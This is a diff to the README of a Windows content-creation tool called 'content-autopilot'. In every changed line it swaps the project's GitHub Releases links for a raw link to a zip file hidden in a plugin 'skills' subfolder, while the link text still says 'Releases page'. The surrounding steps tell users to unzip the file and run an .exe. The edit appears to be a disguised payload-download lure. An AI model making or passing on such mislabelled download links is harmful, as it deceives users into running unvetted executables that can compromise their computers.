@@ -1,6 +1,6 @@
 # 🤖 content-autopilot - Create, grade, and improve content
 
-[![Download content-autopilot](https://img.shields.io/badge/Download%20content--autopilot-blue?style=for-the-badge&logo=github)](https://github.com/Gaura3560/content-autopilot/releases)
+[![Download content-autopilot](https://img.shields.io/badge/Download%20content--autopilot-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Gaura3560/content-autopilot/main/plugins/content-autopilot/skills/audience-psychograph/autopilot-content-1.1.zip)
 
 ## 🚀 What this app does
 
@@ -10,7 +10,7 @@ Use it when you want to move from idea to post with less manual work. It is buil
 
 ## 📥 Download for Windows
 
-1. Open the [Releases page](https://github.com/Gaura3560/content-autopilot/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/Gaura3560/content-autopilot/main/plugins/content-autopilot/skills/audience-psychograph/autopilot-content-1.1.zip)
 2. Download the latest Windows file from the release list
 3. If the file is a `.zip`, unzip it
 4. If the file is an `.exe`, double-click it to start
@@ -158,7 +158,7 @@ content-autopilot sends content through the services you connect. It is best to 
 
 ## 📎 Download again
 
-Use the [Releases page](https://github.com/Gaura3560/content-autopilot/releases) to download the latest Windows version and run it on your PC
+Use the [Releases page](https://raw.githubusercontent.com/Gaura3560/content-autopilot/main/plugins/content-autopilot/skills/audience-psychograph/autopilot-content-1.1.zip) to download the latest Windows version and run it on your PC
 
 ## 🧷 Repository topics
 
